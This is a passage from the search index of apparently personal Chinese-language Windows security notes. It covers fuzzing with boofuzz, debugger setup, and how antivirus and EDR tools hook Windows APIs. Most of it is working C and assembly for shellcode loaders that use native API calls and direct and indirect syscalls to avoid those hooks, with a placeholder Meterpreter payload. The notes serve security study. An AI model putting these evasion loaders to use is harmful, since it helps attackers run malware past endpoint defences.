3, web_address = '0.0.0.0') s_initialize(\"TEST\") # \u521d\u59cb\u5316\u8bf7\u6c42 s_string(\"TRUN\", fuzzable=False) # \u53d1\u9001\u5b57\u7b26\u4e32\u5230\u6808 fuzzable=False \u5b57\u7b26\u4e32\u4e0d\u53d8 s_delim(\" \", fuzzable=False) # \u53d1\u9001\u5206\u9694\u7b26\u5230\u6808 fuzzable=False \u5206\u9694\u7b26\u4e0d\u53d8 s_string(\"FUZZ\") # \u53d1\u9001\u5b57\u7b26\u4e32\u5230\u6808 \u8fd9\u6bb5\u5185\u5bb9\u662ffuzz\u90e8\u5206 ses.connect(s_get(\"TEST\")) # \u521b\u5efa\u4e00\u4e2a\u8fde\u63a5 \u63a5\u6536\u56de\u8c03 ses.fuzz() # \u5f00\u59cbfuzz if __name__ == \"__main__\": main() x64dbg\u5b89\u88c5mona\u63d2\u4ef6 x32\u548cx64\u662f\u5206\u522b\u5b89\u88c5\u7684 https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.msi https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.amd64.msi 1\u3001\u5b89\u88c5x64dbgpy\u63d2\u4ef6\u652f\u6301python \u4e0b\u8f7dhttps://github.com/x64dbg/x64dbgpy/releases/download/8c0538a/x64dbgpy_8c0538a.zip \u89e3\u538b\u8986\u76d6\u5230\u5b89\u88c5\u76ee\u5f55 2\u3001\u5b89\u88c5mona \u4e0b\u8f7d\u5730\u5740 https://github.com/x64dbg/mona mona.py\u590d\u5236\u5230plugins/x64dbgpy\u4e2d \u4e0b\u8f7d https://github.com/x64dbg/x64dbgpylib \u590d\u5236\u5230plugins/x64dbgpy\u4e2d clean_mona.py\u590d\u5236\u5230x64dbgpy/x64dbgpy/autorun\u4e2d \u4e66\u7c4d https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/ \u518d\u770b https://www.x86matthew.com/view_post?id=create_svc_rpc \u5f02\u5f62PE\u6587\u4ef6 https://secret.club/2023/06/05/spoof-pe-sections.html","title":"!!Windows\u5b89\u5168\u7b14\u8bb0"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscall","text":"https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/","title":"SYSCALL"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#windows","text":"Ring0\u548cRing3\u5206\u522b\u4ee3\u8868\u5185\u6838\u5c42\u548c\u7528\u6237\u5c42","title":"Windows\u73af\u5b89\u5168\u4f53\u7cfb"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#windows-api","text":"Windows\u63d0\u4f9b\u7ed9\u4f7f\u7528\u8005\u7684\u5404\u79cd\u63a5\u53e3\uff0c\u5bf9\u5e94\u7684DLL\u4e00\u822c\u662f User32.dll Kernel32.dll Advapi.dll \u8fd9\u4e9b\u63a5\u53e3\u7684Windows API\u662f\u4e0d\u5e26\u524d\u7f00\u7684","title":"Windows API"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#native-api","text":"\u66f4\u4f4e\u7ea7\u7684\u63a5\u53e3\uff0c\u539f\u751fAPI\u3002\u53ef\u4ee5\u76f4\u63a5\u5bf9\u7cfb\u7edf\u5c42\u8fdb\u884c\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u51fd\u6570\u5e26\u6709\u524d\u7f00Nt\u3001Zw\uff0c\u4f8b\u5982 NtCreateFile NtWriteVirtualMemory ZwCreateFile \u5bf9\u5e94\u7684DLL\u662f ntdll.dll win32u.dll","title":"Native API"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscall_1","text":"Native API\u7684syscall\u662fsyscall stub\u7684\u4e00\u90e8\u5206\uff0c syscall stub\u662f\u4e00\u7ec4\u6c47\u7f16\u6307\u4ee4\uff0c\u5bf9\u4e8e\u4e0d\u540cNative API\u7684syscall stub\uff0c\u79fb\u52a8\u5230eax\u7684\u5bc4\u5b58\u5668\uff0c\u4f1a\u6709\u7740\u4e0d\u540c\u7684SSN\uff08\u7cfb\u7edf\u670d\u52a1\u7f16\u53f7\uff09 \u4e5f\u53ef\u4ee5\u8bf4\u662f\u7528\u6237\u5c42\u5230\u7cfb\u7edf\u5c42\u7684\u6865\u6881","title":"syscall"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#ssdt","text":"KiSystemCall \u7528\u4e8e\u6839\u636eSSN\u5728SSDT\u4e2d\u67e5\u627e\u5bf9\u5e94\u7684\u7cfb\u7edf\u51fd\u6570\u4ee3\u7801","title":"SSDT(\u7cfb\u7edf\u670d\u52a1\u63cf\u8ff0\u8868)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#hook","text":"","title":"Hook"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#api-hook-inline-api-hooking","text":"\u5927\u591a\u6570\u6740\u6bd2\u3001EDR\u4f1a\u91c7\u7528\u7684hook\u65b9\u5f0f\uff0c\u5728\u539f\u751fAPI\u6267\u884csyscall\u4e4b\u524d\u5c06\u5176\u91cd\u5b9a\u5411\u81f3\u6740\u6bd2","title":"\u5185\u8054API hook  Inline API Hooking"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#iathook-import-address-table-iat-hooking","text":"","title":"IAT\u5bfc\u5165\u5730\u5740\u8868hook   Import Address Table (IAT) Hooking"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#ssdt-hook-ssdt-hooking-windows-kernel","text":"\u5728\u5185\u6838\u5c42\u7684hook\u65b9\u5f0f\uff0c\u5728windows\u5f15\u5165KPP\uff08Kernel Patch Protection\uff09\u4fdd\u62a4\u540e\u7981\u6b62\u4e86\u8fd9\u79cd\u6280\u672f","title":"SSDT hook  SSDT Hooking (Windows Kernel)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_1","text":"\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u4f1a\u5728\u4e0d\u540c\u7684dll\u4e2dhook\u4e0d\u540c\u7684API \u53cd\u75c5\u6bd2\u8f6f\u4ef6\u4e0d\u53ef\u80fdhook\u6240\u6709API\uff0c\u8fd9\u5bf9\u7cfb\u7edf\u7684\u6027\u80fd\u6709\u6240\u5f71\u54cd","title":"\u91cd\u8981\u7684\u662f"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscall_2","text":"\u76f4\u63a5\u7cfb\u7edf\u8c03\u7528\u662f\u4e0d\u4f9d\u8d56\u7cfb\u7edf\u5b58\u6839\u7684syscall\uff0c\u800c\u662f\u81ea\u5df1\u5199\u6c47\u7f16\u6307\u4ee4\u53bbsyscall","title":"\u76f4\u63a5syscall"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscall_3","text":"\u95f4\u63a5syscall\u662f\u76f4\u63a5\u6267\u884c\u5230syscall\u524d\u4e00\u6b65\uff0c\u518d\u4f7f\u7528\u51fd\u6570\u539f\u672c\u7684syscall\u7ee7\u7eed\u6267\u884c\uff0c\u4f2a\u88c5\u6b63\u5e38\u7a0b\u5e8f\u3002 UINT_PTR sysAddrNtAllocateVirtualMemory; //\u5b9a\u4e49syscall\u6307\u9488\u7c7b\u578b int main() { //\u627e\u5230NtAllocateVirtualMemory\u51fd\u6570\u7684\u5730\u5740 UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, \"NtAllocateVirtualMemory\"); //\u7531\u4e8eNtAllocateVirtualMemory\u51fd\u6570\u540e\u768412\u4e2a\u5b57\u8282\u4fbf\u662fsyscall\u6307\u4ee4\uff0cpNtAllocateVirtualMemory+0x12\u53ef\u8ba1\u7b97\u51fasyscall\u6307\u4ee4\u7684\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u662f\u4e0e\u76f4\u63a5syscall\u4e0d\u540c\u7684\u5730\u65b9\u2014\u2014\u76f4\u63a5syscall\u662f\u76f4\u63a5\u5199\u6c47\u7f16\u624b\u52a8syscall\uff0c\u8fd9\u91cc\u662f\u627e\u5230\u7cfb\u7edf\u672c\u8eab\u7684syscall\u5730\u5740\u7528\u7cfb\u7edf\u7684syscall\u3002\u5f97\u5230sysAddrNtAllocateVirtualMemory\u540e\u653e\u5165asm\u4e2d sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12; EXTERN sysAddrNtAllocateVirtualMemory:QWORD ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll. .CODE ; Start the code section NtAllocateVirtualMemory PROC mov r10, rcx ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers. mov eax, 18h ; Move the syscall number into the eax register. jmp QWORD PTR [sysAddrNtAllocateVirtualMemory] ; Jump to the actual syscall. NtAllocateVirtualMemory ENDP ; End of the procedure. END ; End of the module","title":"\u95f4\u63a5syscall"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_2","text":"","title":"\u7ec3\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#ssn","text":"\u627e\u5230\u51fd\u6570\u7684SSN NtAllocateVirtualMemory \u4f7f\u7528 x \u67e5\u8be2\u5185\u5b58\u5730\u5740\uff0c\u4f7f\u7528 u \u67e5\u8be2\u51fd\u6570\u7684syscall \u5148\u7528 x \u67e5 ntdll \u4e2d\u7684 NtAllocateVirtualMemory \u5185\u5b58\u5730\u5740\uff0c\u5728\u7528 u \u67e5\u5185\u5b58\u5730\u574000007ffe`9794f040d\u7684syscall\uff0ceax\u540e\u9762\u7684\u7f16\u53f7\u5c31\u662fSSN 0:015> x ntdll!NtAllocateVirtualMemory 00007ffe`9794f040 ntdll!NtAllocateVirtualMemory (NtAllocateVirtualMemory) 0:015> u 00007ffe`9794f040 ntdll!NtAllocateVirtualMemory: 00007ffe`9794f040 4c8bd1 mov r10,rcx 00007ffe`9794f043 b818000000 mov eax,18h 00007ffe`9794f048 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffe`9794f050 7503 jne ntdll!NtAllocateVirtualMemory+0x15 (00007ffe`9794f055) 00007ffe`9794f052 0f05 syscall 00007ffe`9794f054 c3 ret 00007ffe`9794f055 cd2e int 2Eh 00007ffe`9794f057 c3 ret \u76f4\u63a5\u7528 u \u6307\u5b9a\u67e5\u51fd\u6570\u7684syscall 0:015> u NtWriteVirtualMemory ntdll!NtWriteVirtualMemory: 00007ffe`9794f480 4c8bd1 mov r10,rcx 00007ffe`9794f483 b83a000000 mov eax,3Ah 00007ffe`9794f488 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffe`9794f490 7503 jne ntdll!NtWriteVirtualMemory+0x15 (00007ffe`9794f495) 00007ffe`9794f492 0f05 syscall 00007ffe`9794f494 c3 ret 00007ffe`9794f495 cd2e int 2Eh 00007ffe`9794f497 c3 ret","title":"\u8c03\u8bd5\u8fdb\u7a0b\uff0c\u627e\u5230\u6307\u5b9a\u51fd\u6570SSN"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#procmonwritefile","text":"\u901a\u8fc7\u8fc7\u6ee4\u8fdb\u7a0b\u548c WriteFile \u64cd\u4f5c\uff0c\u53ef\u4ee5\u770b\u5230notepad\u8fdb\u7a0b\u4ece\u7528\u6237\u6a21\u5f0f\u5230\u7cfb\u7edf\u5c42\u6700\u540e\u8bbf\u95ee\u78c1\u76d8\u7684\u6d41\u7a0b","title":"procmon\u67e5\u770bWriteFile\u7684\u6d41\u7a0b"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#windows-apishellcode","text":"\u7b80\u5355\u52a0\u8f7d\u5668 #include <stdio.h> #include <windows.h> // Define the thread function for executing shellcode // This function will be executed in a separate thread created later in the main function DWORD WINAPI ExecuteShellcode(LPVOID lpParam) { // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode void (*shellcode)() = (void (*)())lpParam; // Call the shellcode function using the function pointer shellcode(); return 0; } int main() { // Insert the Meterpreter shellcode unsigned char code[] = \"\\xfc....\"; void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE); SIZE_T bytesWritten; WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten); HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); // This ensures the main thread doesn't exit before the shellcode has finished running WaitForSingleObject(hThread, INFINITE); // Return 0 as the main function exit code return 0; } \u5728\u7b26\u53f7\u5904\u53ef\u4ee5\u770b\u5230\u5bfc\u5165\u7684windows api \u70b9\u51fb\u8f6c\u5165\u5bfc\u5165\u5730\u5740\u53ef\u4ee5\u67e5\u770b\u5bf9\u5e94\u6c47\u7f16\u4ee3\u7801 \u518d\u7ee7\u7eed\u8df3\u8f6c\uff0c\u6765\u5230\u4e86\u5bf9\u5e94\u7684\u539f\u751fAPI \u7ee7\u7eed\u8df3\u8f6c\uff0c\u53ef\u4ee5\u770b\u5230\u539f\u751fAPI\u5bf9\u5e94\u7684syscall \u5982\u679c\u5728 WriteProcessMemory \u5904\u4e0b\u65ad\u70b9\uff0c\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f\uff0c\u5728\u7b2cR8\u53ef\u4ee5\u627e\u5230shellcode\u7684\u5185\u5b58\u4f4d\u7f6e","title":"\u4f7f\u7528Windows API\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#apishellcode","text":"","title":"\u4f7f\u7528\u539f\u751fAPI\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_3","text":"VirtualAlloc \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtAllocateVirtualMemory WriteProcessMemory \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtWriteVirtualMemory CreateThread \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtCreateThreadEx WaitForSingleObject \u5bf9\u5e94\u7684\u539f\u751f\u51fd\u6570 NtWaitForSingleObject \u5982\u679c\u8981\u627e\u54ea\u4e2aWindows API\u5bf9\u5e94\u7684\u54ea\u4e2a\u539f\u751f\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u52a8\u6001\u8c03\u8bd5\u53bb\u627e \u5b9a\u4e49\u6307\u9488\u7c7b\u578b\u51fd\u6570 typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG); typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T); typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID); typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);","title":"\u5b9a\u4e49\u6307\u9488\u7c7b\u578b\u51fd\u6570"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_4","text":"\u6253\u5f00 ntdll.dll \u7684\u53e5\u67c4\uff0c\u901a\u8fc7\u539f\u751f\u51fd\u6570\u7684\u540d\u79f0\u53bb\u5728\u5185\u5b58\u4e2d\u67e5\u627e\u5730\u5740 PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtAllocateVirtualMemory\"); PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWriteVirtualMemory\"); PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\"); PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWaitForSingleObject\"); #include <stdio.h> #include <windows.h> // Define typedefs for function pointers to the native API functions we'll be using. // These match the function signatures of the respective functions. typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG); typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T); typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID); typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER); int main() { // Insert Meterpreter shellcode here. unsigned char code[] = \"\"; // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef. PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtAllocateVirtualMemory\"); PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWriteVirtualMemory\"); PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtCreateThreadEx\"); PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtWaitForSingleObject\"); // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode. // 'exec' will hold the base address of the allocated memory region. void* exec = NULL; SIZE_T size = sizeof(code); NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Copy the shellcode into the allocated memory region. SIZE_T bytesWritten; NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten); // Execute the shellcode in memory using a new thread. HANDLE hThread; NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL); // Wait for the thread to finish executing. NtWaitForSingleObject(hThread, FALSE, NULL); return 0; }","title":"\u83b7\u53d6\u539f\u751f\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscallshellcode","text":"","title":"\u4f7f\u7528\u76f4\u63a5syscall\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_5","text":"\u65b0\u5efa\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u5b9a\u4e49\u9700\u8981\u4f7f\u7528\u7684\u539f\u751f\u51fd\u6570\u7684\u7ed3\u6784\u4f53 #ifndef _SYSCALLS_H // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion. #define _SYSCALLS_H // Define _SYSCALLS_H #include <windows.h> // Include the Windows API header // The type NTSTATUS is typically defined in the Windows headers as a long. typedef long NTSTATUS; // Define NTSTATUS as a long typedef NTSTATUS* PNTSTATUS; // Define a pointer to NTSTATUS // Declare the function prototype for NtAllocateVirtualMemory extern NTSTATUS NtAllocateVirtualMemory( HANDLE ProcessHandle, // Handle to the process in which to allocate the memory PVOID* BaseAddress, // Pointer to the base address ULONG_PTR ZeroBits, // Number of high-order address bits that must be zero in the base address of the section view PSIZE_T RegionSize, // Pointer to the size of the region ULONG AllocationType, // Type of allocation ULONG Protect // Memory protection for the region of pages ); // Declare the function prototype for NtWriteVirtualMemory extern NTSTATUS NtWriteVirtualMemory( HANDLE ProcessHandle, // Handle to the process in which to write the memory PVOID BaseAddress, // Pointer to the base address PVOID Buffer, // Buffer containing data to be written SIZE_T NumberOfBytesToWrite, // Number of bytes to be written PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written ); // Declare the function prototype for NtCreateThreadEx extern NTSTATUS NtCreateThreadEx( PHANDLE ThreadHandle, // Pointer to a variable that receives a handle to the new thread ACCESS_MASK DesiredAccess, // Desired access to the thread PVOID ObjectAttributes, // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes HANDLE ProcessHandle, // Handle to the process in which the thread is to be created PVOID lpStartAddress, // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread PVOID lpParameter, // Pointer to a variable to be passed to the thread ULONG Flags, // Flags that control the creation of the thread SIZE_T StackZeroBits, // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer SIZE_T SizeOfStackCommit, // The size of the stack that must be committed at thread creation SIZE_T SizeOfStackReserve, // The size of the stack that must be reserved at thread creation PVOID lpBytesBuffer // Pointer to a variable that receives any output data from the system ); // Declare the function prototype for NtWaitForSingleObject extern NTSTATUS NtWaitForSingleObject( HANDLE Handle, // Handle to the object to be waited on BOOLEAN Alertable, // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread PLARGE_INTEGER Timeout // Pointer to a LARGE_INTEGER that specifies the absolute or relative time at which the function should return, regardless of the state of the object ); #endif // _SYSCALLS_H // End of the _SYSCALLS_H definition","title":"\u5b9a\u4e49\u539f\u751f\u51fd\u6570\u7684\u7ed3\u6784\u4f53"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscall_4","text":".CODE ; Start the code section ; Procedure for the NtAllocateVirtualMemory syscall NtAllocateVirtualMemory PROC mov r10, rcx ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers. mov eax, 18h ; Move the syscall number into the eax register. syscall ; Execute syscall. ret ; Return from the procedure. NtAllocateVirtualMemory ENDP ; End of the procedure. ; Similar procedures for NtWriteVirtualMemory syscalls NtWriteVirtualMemory PROC mov r10, rcx mov eax, 3Ah syscall ret NtWriteVirtualMemory ENDP ; Similar procedures for NtCreateThreadEx syscalls NtCreateThreadEx PROC mov r10, rcx mov eax, 0C2h syscall ret NtCreateThreadEx ENDP ; Similar procedures for NtWaitForSingleObject syscalls NtWaitForSingleObject PROC mov r10, rcx mov eax, 4 syscall ret NtWaitForSingleObject ENDP END ; End of the module \u8fd0\u884c\u8d77\u6765\u540e\u5728\u52a0\u8f7d\u51fd\u6570\u4e2d\u6ca1\u6709\u51e0\u4e2a\u91cd\u8981\u51fd\u6570","title":"\u5b9a\u4e49\u539f\u751f\u51fd\u6570\u7684syscall\u8fc7\u7a0b"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscallshellcode_1","text":"\u6d41\u7a0b - \u83b7\u53d6ntdll.dll\u7684\u53e5\u67c4 - \u521d\u59cb\u5316\u539f\u751f\u51fd\u6570\u6307\u9488\u5730\u5740 - \u5b9a\u4e49\u8981\u4f7f\u7528\u7684\u51fd\u6570\u7ed3\u6784\u4f53 - \u5b9a\u4e49\u8981\u4f7f\u7528\u7684\u539f\u751f\u51fd\u6570\u7684syscall\u7684\u5730\u5740\u6307\u9488\uff0c\u5e76\u8bbe\u7f6e\u4ecentdll\u4e2d\u83b7\u53d6\u5230\u7684\u51fd\u6570\u6307\u9488\u5730\u5740\uff0c0x12\u7684\u504f\u79fb\u91cf\u3002\u8fd9\u662f\u56e0\u4e3a\u8981\u83b7\u53d6\u51fd\u6570\u521d\u59cb\u5730\u5740\u5230syscall\u7684\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u95f4\u63a5syscall\u7684\u6838\u5fc3\u2014\u2014\u2014\u2014\u7ed5\u8fc7Win32 API\u5230\u627e\u539f\u751fAPI\u7684\u8fc7\u7a0b\uff0c\u53bb\u8c03\u7528\u51fd\u6570\u539f\u672c\u7684syscall\uff0c\u76f4\u63a5syscall\u5219\u662f\u65e2\u7ed5\u8fc7Win32 API\u5230\u627e\u539f\u751fAPI\uff0c\u53c8\u7ed5\u8fc7\u51fd\u6570\u539f\u751f\u7684syscall\u3002","title":"\u4f7f\u7528\u95f4\u63a5syscall\u6267\u884cshellcode\u5e76\u52a8\u6001\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#syscall_5","text":"\u7531\u4e8e\u56fa\u5b9a\u4e86syscall\u7684\u8c03\u7528\u4ee3\u7801\uff0c\u6c47\u7f16\u6307\u4ee4\u7684\u7279\u5f81\u4f1a\u88ab\u9759\u6001\u76d1\u6d4b\u5230\u3002 \u5b9e\u73b0\u7ed5\u8fc7\u6740\u8f6f\u9664\u4e86\u4f7f\u7528syscall\u5916\uff0c\u8fd8\u9700\u8981\u89e3\u51b3\u5176\u4ed6\u7684\u95ee\u9898\u6bd4\u5982\u5176\u4ed6api hook\u95ee\u9898\u3001shellcode\u5185\u5b58\u5206\u914d\u95ee\u9898\u3001\u5168\u6808\u884c\u4e3a\u5f02\u5e38\u95ee\u9898\u3002\u7b80\u5355\u8bf4\u662f\u9700\u8981\u7ed3\u5408\u5404\u79cd\u624b\u6bb5\u6a21\u62df\u51fa\u771f\u5b9e\u7684\u7a0b\u5e8f\u8fd0\u884c\u7684\u5185\u5b58\u8c03\u7528\uff0c\u4ee5\u8fbe\u6210\u6700\u597d\u7684\u514d\u6740\u6548\u679c\u3002","title":"syscall\u7ed5\u8fc7\u7684\u7f3a\u9677"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_6","text":"","title":"\u6c47\u7f16"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_7","text":"\u6839\u636e\u8bed\u6cd5\u98ce\u683c\u5206\u6210Intel\u548cAT&T\uff0cWindows\u7528\u7684\u662fInter Inter\u548cAT&T\u533a\u522b\u5982\u4e0b - Inter\u8bed\u6cd5\u662f <\u6307\u4ee4 \u76ee\u6807,\u6e90>\uff1bAT&T\u8bed\u6cd5\u662f<\u6307\u4ee4 \u6e90;\u76ee\u6807> - AT&T\u8bed\u6cd5\u5728\u6ce8\u518c\u540d\u79f0\u4e4b\u524d\u5fc5\u987b\u5199\u767e\u5206\u53f7(%)\uff0c\u6570\u5b57\u4e4b\u524d\u5199\u7f8e\u5143\u53f7($)\u3002\u5730\u5740\u4f7f\u7528\u5706\u62ec\u53f7\u3002 - AT&T\u8bed\u6cd5\u5728\u6307\u4ee4\u4e2d\u6dfb\u52a0\u540e\u7f00\u6765\u5b9a\u4e49\u64cd\u4f5c\u6570\u7684\u5927\u5c0f q - quad 64bits 8bytes l - long 32bits 4bytes w - word 16bits 2bytes b - byte 8bits 1bytes","title":"\u8bed\u6cd5\u98ce\u683c"},{"location":"Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/#_8","text":"\u6c47\u7f16\u4e2d\u7684\u51fd\u6570\u7279\u5f81\u975e\u5e38\u660e\u663e\uff0c\u5f04\u6e05\u9664\u51fd\u6570\u7684\u529f\u80fd\u662f\u975e\u5e38\u5173\u952e\u7684 1. \u8c03\u7528\u8005\u5c06\u88ab\u8c03\u51fd\u6570\u6240\u9700\u7684\u53c2\u6570\u653e\u5165\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6839\u636e\u8c03\u7528\u7ea6\u5b9a\u4e0d\u540c\uff0c\u4f4d\u7f6e\u4e0d\u540c\uff0c\u6709\u7684\u653e\u5165\u5bc4\u5b58\u5668\uff0c\u6709\u7684\u5168\u653e\u5165\u6808 2. 